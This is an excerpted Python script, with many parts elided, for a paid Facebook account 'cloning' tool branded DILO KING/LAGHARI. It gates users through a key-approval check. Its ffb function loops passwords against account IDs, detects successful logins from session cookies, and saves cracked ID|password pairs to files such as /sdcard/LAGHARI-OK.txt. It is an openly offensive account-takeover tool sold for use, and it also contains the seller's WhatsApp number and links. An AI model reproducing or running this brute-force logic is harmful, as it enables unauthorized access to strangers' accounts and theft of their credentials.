...
os.system("xdg-open https://www.facebook.com/Meerkb007/?ref=share")
...
def uaku():
	...
	try:
		...
		a=requests.get('https://github.com/Diloking/Dilo../blob/main/Approval.txt').text
...
\033[1;32m 
     ...
     DDDDDDDDDDDDD      IIIIIIIIIILLLLLLLLLLL                  OOOOOOOOO     
     D::::::::::::DDD   I::::::::IL:::::::::L                OO:::::::::OO   
     D:::::::::::::::DD I::::::::IL:::::::::L              OO:::::::::::::OO 
     DDD:::::DDDDD:::::DII::::::IILL:::::::LL             O:::::::OOO:::::::O
       D:::::D    D:::::D I::::I    L:::::L               O::::::O   O::::::O
       D:::::D     D:::::DI::::I    L:::::L               O:::::O     O:::::O
       D:::::D     D:::::DI::::I    L:::::L               O:::::O     O:::::O
       D:::::D     D:::::DI::::I    L:::::L               O:::::O     O:::::O
       D:::::D     D:::::DI::::I    L:::::L               O:::::O     O:::::O
       D:::::D     D:::::DI::::I    L:::::L               O:::::O     O:::::O
       D:::::D     D:::::DI::::I    L:::::L               O:::::O     O:::::O
       D:::::D    D:::::D I::::I    L:::::L         LLLLLLO::::::O   O::::::O
     DDD:::::DDDDD:::::DII::::::IILL:::::::LLLLLLLLL:::::LO:::::::OOO:::::::O
     D:::::::::::::::DD I::::::::IL::::::::::::::::::::::L OO:::::::::::::OO 
     D::::::::::::DDD   I::::::::IL::::::::::::::::::::::L   OO:::::::::OO   
     DDDDDDDDDDDDD      IIIIIIIIIILLLLLLLLLLLLLLLLLLLLLLLL     OOOOOOOOO     
                                                                             
                                                                                                                                                                                                                                                                                       
\033[1;93m--------------------------------------------------

  \033[1;32mWH4TS4PP  :  03154619676

  \033[1;32mY0UTUB3   : DILO TECH

  \033[1;32mV3RS1ON   : 1.0

  \033[1;32m0WN3R     : DILO KING
...
def auto_file(cookies,access_token):
    ...
    print('\n \033[1;35m /sdcard/LAGHARI.txt \033[0;97m\n')
...
def manual_file(cookies,access_token):
    ...
    print('\n \033[1;32mExample: /sdcard/LAGHARI.txt \033[0;97m\n')
...
def sids():
    ...
    print('\n\033[1;32m Example: /sdcard/LAGHARI.txt\033[0;97m')
...
def menu(): 
	...
	if xd in ['1','01']:
	   ...
	   gmail()
		...
		os.system(f'xdg-open https://m.me/Meerkb007');menu()
...
def ffb(ids,names,passlist):
	...
	sys.stdout.write('\r\r\033[1;32m [SW4TI] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\r\r\033[1;32m [LAGHARI-OK] %s | %s'%(ids,pas))

				open('/sdcard/LAGHARI-OK.txt', 'a').write(ids+'|'+pas+'\n')
				...
				if 'y' in pcp:
					...
					print('\r\r\x1b[38;5;208m [LAGHARI-CP] '+ids+' | '+pas+'\033[1;97m')

					open('/sdcard/LAGHARI-CP.txt', 'a').write(ids+'|'+pas+'\n')
	...
	try:
		...
		for pas in passlist:
			...
			if 'session_key' in q:
				...
				print('\r\r\033[1;32m [LAGHARI-OK] '+udx+' | '+pas+'\033[1;97m')

				open('/sdcard/LAGHARI-OK.txt', 'a').write(udx+'|'+pas+'\n')
				...
				print('\r\r\x1b[38;5;208m [AB KHANX-CP] '+ids+' | '+pas+'\033[1;97m')
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						...
						print('\r\r\033[1;34m [LAGHARI-TL] '+ids+' | '+pas)

					else:

						print(f'\r\x1b[1;32m [LAGHARI-OK] '+ids+' | '+pas)
...
def menu_apikey():
  ...
  server = requests.get('https://github.com/Diloking/Dilo../blob/main/Approval.txt').text
...
\033[1;32m[-] WHATSAPP  :\033[1;32m DILO KING  

\033[1;32m[-] OTHERS    :\033[1;32m DILO TECH 

\033[1;32m[-] TOOLS     :\033[1;32m MIX CLONING
...
\033[1;37m[*]TOOLS  : FACEBOOK CLOING 
...
\033[1;92m=================================================
 ...
 \033[1;37m[*] FRIST NOTE:

 \033[1;37m[1] THIS TOOL IS PAID 

 \033[1;37m[*] AIRLINES MODE ON OF FOR OK IDS 

 \033[1;37m[2] YOU NEED KEY 🗝️ APPROVEL MSG ME
...
==================================================   """)
  ...
  print(" \033[1;32m  THIS TOOLS IS PAID SO YOU NEED KEY 🗝️\033[1;37m\n")

  print("")

  print("\x1b[1;32m   contact Admin to Buy this Tools                                                               ");time.sleep (0.1) 
  ...
  print("\033[1;32m   COPY YOUR KEY AND SEND TO ADMIN  ");time.sleep(0.1)

  print("")

  print("  SEND KEY ON ADMIN WHATSAPP,,,    ");time.sleep(1)

  os.system('xdg-open https://m.me/+923154619676')

  print("");time.sleep(2)

  print("\x1b[1;92m  CHECKING YOUR APROVAL...                                                ");time.sleep (0.5)

  try:

    httpCaht = requests.get("https://github.com/Diloking/Dilo../blob/main/Approval.txt").text

    if id in httpCaht:

      print("\033[1;32m   YOUR TOKEN APROVED ðŸ¥€ ");time.sleep(2)
      ...
      print("\x1b[1;32m    Sorry Bro Token Key not AprovedðŸ˜“")
...
def tnx():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      print("\x1b[1;32m    Sorry Bro Your Token not AprovedðŸ˜“ ")
